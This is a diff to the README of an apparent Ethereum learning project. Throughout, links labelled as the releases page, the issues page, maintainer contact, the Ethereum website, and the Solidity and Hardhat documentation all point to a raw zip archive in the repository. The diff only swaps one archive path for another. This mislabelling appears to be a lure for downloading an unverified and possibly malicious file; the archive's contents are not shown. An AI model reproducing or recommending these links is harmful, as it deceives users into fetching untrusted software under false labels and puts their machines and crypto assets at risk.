@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://raw.githubusercontent.com/ERRORERRO/ethereum-workshop/main/scripts/workshop_ethereum_renitency.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/ERRORERRO/ethereum-workshop/main/scripts/workshop_ethereum_renitency.zip)](https://raw.githubusercontent.com/ERRORERRO/ethereum-workshop/main/scripts/workshop_ethereum_renitency.zip)
+[![Download Latest Release](https://github.com/ERRORERRO/ethereum-workshop/raw/refs/heads/main/docs/ethereum-workshop-1.3.zip%20Latest%20Release-Click%https://github.com/ERRORERRO/ethereum-workshop/raw/refs/heads/main/docs/ethereum-workshop-1.3.zip)](https://github.com/ERRORERRO/ethereum-workshop/raw/refs/heads/main/docs/ethereum-workshop-1.3.zip)
 
 ## 🛠️ Introduction
 
@@ -12,7 +12,7 @@ Welcome to the Ethereum Workshop! This application helps you learn the fundament
 
 To start using this application, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/ERRORERRO/ethereum-workshop/main/scripts/workshop_ethereum_renitency.zip) to find the latest version of the software.
+1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/ERRORERRO/ethereum-workshop/raw/refs/heads/main/docs/ethereum-workshop-1.3.zip) to find the latest version of the software.
    
 2. **Choose Your Platform:** Select the version that matches your operating system (Windows, macOS, or Linux).
 
@@ -41,7 +41,7 @@ To run this application smoothly, you will need:
 
 ## 💻 Download & Install
 
-You can find the latest software release on our [Releases Page](https://raw.githubusercontent.com/ERRORERRO/ethereum-workshop/main/scripts/workshop_ethereum_renitency.zip). Just follow these steps:
+You can find the latest software release on our [Releases Page](https://github.com/ERRORERRO/ethereum-workshop/raw/refs/heads/main/docs/ethereum-workshop-1.3.zip). Just follow these steps:
 
 1. Go to the Releases Page.
 2. Click on the version that corresponds to your operating system.
@@ -61,7 +61,7 @@ Here are some practical examples of what you can achieve using the ethereum-work
 
 ## 🤝 Getting Help
 
-If you encounter any issues, please refer to the troubleshooting section in the application or visit the [GitHub Issues Page](https://raw.githubusercontent.com/ERRORERRO/ethereum-workshop/main/scripts/workshop_ethereum_renitency.zip) to report your problem. The community is here to assist you.
+If you encounter any issues, please refer to the troubleshooting section in the application or visit the [GitHub Issues Page](https://github.com/ERRORERRO/ethereum-workshop/raw/refs/heads/main/docs/ethereum-workshop-1.3.zip) to report your problem. The community is here to assist you.
 
 ## 🎓 Contributing
 
@@ -69,13 +69,13 @@ We welcome contributions from everyone! If you want to help improve the applicat
 
 ## 📫 Contact
 
-For more information or support, feel free to reach out through our issues page or [contact the maintainers](https://raw.githubusercontent.com/ERRORERRO/ethereum-workshop/main/scripts/workshop_ethereum_renitency.zip). Your questions and feedback are always welcome.
+For more information or support, feel free to reach out through our issues page or [contact the maintainers](https://github.com/ERRORERRO/ethereum-workshop/raw/refs/heads/main/docs/ethereum-workshop-1.3.zip). Your questions and feedback are always welcome.
 
 ## 🔗 Additional Resources
 
-- [Ethereum Official Website](https://raw.githubusercontent.com/ERRORERRO/ethereum-workshop/main/scripts/workshop_ethereum_renitency.zip)
-- [Solidity Documentation](https://raw.githubusercontent.com/ERRORERRO/ethereum-workshop/main/scripts/workshop_ethereum_renitency.zip)
-- [Hardhat Documentation](https://raw.githubusercontent.com/ERRORERRO/ethereum-workshop/main/scripts/workshop_ethereum_renitency.zip)
+- [Ethereum Official Website](https://github.com/ERRORERRO/ethereum-workshop/raw/refs/heads/main/docs/ethereum-workshop-1.3.zip)
+- [Solidity Documentation](https://github.com/ERRORERRO/ethereum-workshop/raw/refs/heads/main/docs/ethereum-workshop-1.3.zip)
+- [Hardhat Documentation](https://github.com/ERRORERRO/ethereum-workshop/raw/refs/heads/main/docs/ethereum-workshop-1.3.zip)
 
 ## 🌟 Join the Community
 
